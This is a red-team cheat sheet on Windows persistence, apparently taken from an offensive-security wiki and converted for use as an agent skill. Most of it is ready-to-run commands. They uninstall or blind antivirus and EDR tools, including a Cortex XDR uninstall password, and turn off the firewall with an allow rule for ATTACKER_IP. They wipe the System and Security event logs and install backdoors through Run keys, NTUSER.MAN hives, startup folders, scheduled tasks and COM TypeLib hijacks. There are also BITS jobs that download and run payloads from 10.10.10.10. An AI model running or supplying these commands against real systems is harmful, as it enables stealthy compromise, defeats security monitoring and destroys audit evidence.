<!-- provenance: InternalAllTheThings docs/redteam/persistence/windows-persistence.md @ 203bb0c | part 1/3: Windows Persistence - Hide, Disable Defenses, Simple User | converted for Agent Skills; see ../../NOTICE.md -->

# Windows - Persistence

## Summary

* [Tools](#tools)
* [Hide Your Binary](#hide-your-binary)
* [Disable Antivirus and Security](#disable-antivirus-and-security)
    * [Antivirus Removal](#antivirus-removal)
    * [Disable Windows Defender](#disable-windows-defender)
    * [Disable Windows Firewall](#disable-windows-firewall)
    * [Clear System and Security Logs](#clear-system-and-security-logs)
* [Simple User](#simple-user)
    * [Registry HKCU](#registry-hkcu)
    * [Startup](#startup)
    * [Scheduled Tasks User](#scheduled-tasks-user)
    * [BITS Jobs](#bits-jobs)
* [Serviceland](windows-persistence-elevated.md#serviceland)
    * [IIS](windows-persistence-elevated.md#iis)
    * [Windows Service](windows-persistence-elevated.md#windows-service)
* [Elevated](windows-persistence-elevated.md#elevated)
    * [Registry HKLM](windows-persistence-elevated.md#registry-hklm)
        * [Winlogon Helper DLL](windows-persistence-elevated.md#winlogon-helper-dll)
        * [GlobalFlag](windows-persistence-elevated.md#globalflag)
    * [Startup Elevated](windows-persistence-elevated.md#startup-elevated)
    * [Services Elevated](windows-persistence-elevated.md#services-elevated)
    * [Service Security Descriptor](windows-persistence-elevated.md#servicesecuritydescriptor)
    * [Scheduled Tasks Elevated](windows-persistence-elevated.md#scheduled-tasks-elevated)
    * [Binary Replacement](windows-persistence-elevated.md#binary-replacement)
        * [Binary Replacement on Windows XP+](windows-persistence-elevated.md#binary-replacement-on-windows-xp)
        * [Binary Replacement on Windows 10+](windows-persistence-elevated.md#binary-replacement-on-windows-10)
    * [Skeleton Key](windows-persistence-elevated.md#skeleton-key)
    * [Virtual Machines](windows-persistence-elevated.md#virtual-machines)
    * [Windows Subsystem for Linux](windows-persistence-elevated.md#windows-subsystem-for-linux)
* [Domain](windows-persistence-domain.md#domain)
    * [Golden Certificate](windows-persistence-domain.md#golden-certificate)
    * [Golden Ticket](windows-persistence-domain.md#golden-ticket)
* [References](windows-persistence-domain.md#references)

## Tools

* [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)

## Hide Your Binary

> Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.

```ps1
PS> attrib +h mimikatz.exe
```

## Disable Antivirus and Security

### Antivirus Removal

* [Sophos Removal Tool.ps1](https://github.com/ayeskatalas/Sophos-Removal-Tool/)
* [Symantec CleanWipe](https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html)
* [Elastic EDR/Security](https://www.elastic.co/guide/en/fleet/current/uninstall-elastic-agent.html)

    ```ps1
    cd "C:\Program Files\Elastic\Agent\"
    PS C:\Program Files\Elastic\Agent> .\elastic-agent.exe uninstall
    Elastic Agent will be uninstalled from your system at C:\Program Files\Elastic\Agent. Do you want to continue? [Y/n]:Y
    Elastic Agent has been uninstalled.
    ```

* [Cortex XDR](https://mrd0x.com/cortex-xdr-analysis-and-bypass/)

    ```ps1
    # Global uninstall password: Password1
    Password hash is located in C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
    Look for PasswordHash, PasswordSalt or password, salt strings.

    # Disable Cortex: Change the DLL to a random value, then REBOOT
    reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f

    # Disables the agent on startup (requires reboot to work)
    cytool.exe startup disable

    # Disables protection on Cortex XDR files, processes, registry and services
    cytool.exe protect disable

    # Disables Cortex XDR (Even with tamper protection enabled)
    cytool.exe runtime disable

    # Disables event collection
    cytool.exe event_collection disable
    ```

### Disable Windows Defender

```powershell
# Disable Defender
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

## Exclude a process / location
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install

# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
# Disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

# Wipe currently stored definitions
# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
MpCmdRun.exe -RemoveDefinitions -All

# Remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# Disable Windows Defender Security Center
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

# Disable Real Time Protection
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
```

### Disable Windows Firewall

```powershell
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

# ip whitelisting
New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```

### Clear System and Security Logs

```powershell
cmd.exe /c wevtutil.exe cl System
cmd.exe /c wevtutil.exe cl Security
```

## Simple User

Set a file as hidden

```powershell
attrib +h c:\autoexec.bat
```

### Registry HKCU

Create a `REG_SZ` value in the `Run` key within `HKCU\Software\Microsoft\Windows`.

```powershell
Value name:  Backdoor
Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
```

* Using the command line

    ```powershell
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
    ```

* Using [mandiant/SharPersist](https://github.com/mandiant/SharPersist)

    ```powershell
    SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
    SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env
    SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
    ```

#### Persistence via NTUSER.MAN

Directly modifying `HKCU` for persistence (e.g., `Run` keys) is noisy and commonly detected by modern EDR solutions. A lesser-known alternative is to pre-seed the user’s registry hive offline by abusing `NTUSER.MAN`, which Windows treats as a mandatory profile.

When a user logs in, Windows loads their registry hive from disk. If an `NTUSER.MAN` file is present instead of (or alongside) `NTUSER.DAT`, Windows loads the hive as read-only and applies its contents verbatim—without generating the usual registry modification telemetry.

Instead of editing the live registry:

1. Export the target user’s `HKCU` hive

   * Via `reg export HKCU exported.reg`
   * Using a BOF-based approach to avoid spawning `reg.exe`.

2. Modify the exported registry data offline

   * Add or change persistence mechanisms (e.g., `Run` keys).

3. Convert the modified `.reg` file into a binary hive

   * Use [praetorian-inc/swarmer](https://github.com/praetorian-inc/swarmer) to generate a valid `NTUSER.MAN`.

4. Drop the resulting `NTUSER.MAN` into the user’s profile directory

   * `%USERPROFILE%\NTUSER.MAN`

Example:

```powershell
swarmer.exe --startup-key "Updater" --startup-value "C:\Path\To\payload.exe" exported.reg NTUSER.MAN
```

On the next logon, Windows loads this hive automatically, establishing persistence without touching the live registry.

**Mandatory profile side effects**
Creating an `NTUSER.MAN` converts the user profile into a mandatory profile. Any registry or profile changes made during the session are discarded at logoff and will not persist across logins.

**Immutability without elevation**
Once deployed, the hive is effectively immutable. Modifying or removing the persistence requires deleting `NTUSER.MAN`, which typically necessitates administrative privileges.

**Login-time loading only**
The hive is loaded exclusively during user logon. Changes to `NTUSER.MAN` have no effect until the user fully logs out and logs back in.

**Limited scope**
This technique applies only to the user registry hive (HKCU). It does not impact machine-wide settings (HKLM) and provides per-user persistence only.

### Startup

Create a batch script in the user startup folder: `%AppData%`

```powershell
PS C:\> gc C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
start /b C:\Users\Username\AppData\Local\Temp\backdoor.exe
```

Using SharPersist

```powershell
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
```

### Scheduled Tasks User

* Using native **schtask** - Create a new task

    ```powershell
    # Create the scheduled tasks to run once at 00.00
    schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
    # Force run it now !
    schtasks /run /tn "Device-Synchronize"
    ```

* Using native **schtask** - Leverage the `schtasks /change` command to modify existing scheduled tasks

    ```powershell
    # Launch an executable by calling the ShellExec_RunDLL function.
    SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
    ```

* Using Powershell

    ```powershell
    PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
    PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
    PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
    PS C:\> $S = New-ScheduledTaskSettingsSet
    PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
    PS C:\> Register-ScheduledTask Backdoor -InputObject $D
    ```

* Using SharPersist

    ```powershell
    # Add to a current scheduled task
    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

    # Add new task
    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
    ```

### BITS Jobs

```powershell
bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"

# v1
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor

# v2 - exploit/multi/script/web_delivery
bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
bitsadmin /resume backdoor
```

### COM TypeLib

* [CICADA8-Research/TypeLibWalker](https://github.com/CICADA8-Research/TypeLibWalker) - TypeLib persistence technique

Use [sysinternals/procmon](https://learn.microsoft.com/fr-fr/sysinternals/downloads/procmon) to find `RegOpenKey` with the status `NAME NOT FOUND`. The process `explorer.exe` is a good target, as it will spawn your payload every time it is run.

```ps1
Path: HKCU\Software\Classes\TypeLib\{CLSID}\1.1\0\win32
Path: HKCU\Software\Classes\TypeLib\{CLSID}\1.1\0\win64
Name: anything
Type: REG_SZ
Value: script:C:\1.sct
```

Example of content for `1.sct`.

```xml
<?xml version="1.0"?>
<scriptlet>
    <registration
        description="explorer"
        progid="explorer"
        version="1.0"
        classid="{66666666-6666-6666-6666-666666666666}"
        remotable="true">
    </registration>
    <script language="JScript">
        <![CDATA[
            var WShell = new ActiveXObject("WScript.Shell");
            WShell.Run("calc.exe");
        ]]>
    </script>
</scriptlet>
```
